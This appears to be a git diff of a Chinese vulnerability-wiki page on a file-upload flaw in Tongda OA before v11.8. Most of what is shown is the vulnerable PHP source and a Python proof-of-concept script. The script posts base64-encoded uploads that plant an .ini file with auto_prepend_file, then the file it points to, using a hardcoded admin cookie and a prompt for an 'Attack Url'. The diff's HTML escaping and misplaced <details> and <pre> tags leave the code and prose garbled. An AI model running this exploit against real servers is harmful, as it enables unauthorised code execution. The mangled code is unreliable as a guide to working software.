@@ -22,8 +22,10 @@ tags:
 
 ```
 通达OA < v11.8
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 环境搭建
 
 [通达OA v11.6下载链接](https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe)
@@ -37,7 +39,7 @@ tags:
 出现漏洞的文件为 **webroot/general/hr/manage/staff_info/update.php**
 
 ```php
-<?php
+&lt;?php
 
 include_once "inc/auth.inc.php";
 include_once "inc/utility_all.php";
@@ -51,8 +53,8 @@ if (strstr($BYNAME, "/") || strstr($BYNAME, "\\") || strstr($BYNAME, "..")) {
 }
 
 include_once "inc/header.inc.php";
-echo "\r\n<body class=\"bodycolor\">\r\n";
-echo "\r\n<body class=\"bodycolor\">\r\n";
+echo "\r\n&lt;body class=\"bodycolor\"&gt;\r\n";
+echo "\r\n&lt;body class=\"bodycolor\"&gt;\r\n";
 $PHOTO_NAME0 = $_FILES["ATTACHMENT"]["name"];
 $ATTACHMENT = $_FILES["ATTACHMENT"]["tmp_name"];
 
@@ -76,8 +78,9 @@ if ($PHOTO_NAME0 != "") {
 		Button_Back();
 		exit();
 	}
-}
-```
+}</code></pre>
+
+</details>
 
 ![image-20220209111308741](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091113931.png)
 
@@ -156,8 +159,10 @@ if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") ===
 	else {
 		return true;
 	}
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 路径中必须要包含  **webroot 和 attachment** 才可以上传
 
 ![image-20220209111502133](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091115242.png)
@@ -189,10 +194,10 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 def title():
     print('+------------------------------------------')
     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
-    print('+  \033[34mVersion: 通达OA < V11.8                                             \033[0m')
+    print('+  \033[34mVersion: 通达OA &lt; V11.8                                             \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
-    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
-    print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')
+    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
+    print('+  \033[36mCookie      &gt;&gt;&gt; xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')
     print('+------------------------------------------')
 
 def POC_1(target_url, Cookie):
@@ -207,7 +212,7 @@ def POC_1(target_url, Cookie):
         "Cookie": Cookie,
         "Upgrade-Insecure-Requests": "1",
     }
-    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
+    data = &#98;ase64.&#98;64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
@@ -234,7 +239,7 @@ def POC_2(target_url, Cookie):
         "Cookie":  Cookie,
         "Upgrade-Insecure-Requests": "1",
     }
-    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")
+    data = &#98;ase64.&#98;64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
@@ -269,10 +274,11 @@ def POC_3(target_url, Cookie):
 
 if __name__ == '__main__':
     title()
-    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
     Cookie = "USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31"
-    POC_1(target_url, Cookie)
-```
+    POC_1(target_url, Cookie)</code></pre>
+
+</details>
 
 ![image-20220209111615822](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091116959.png)
 
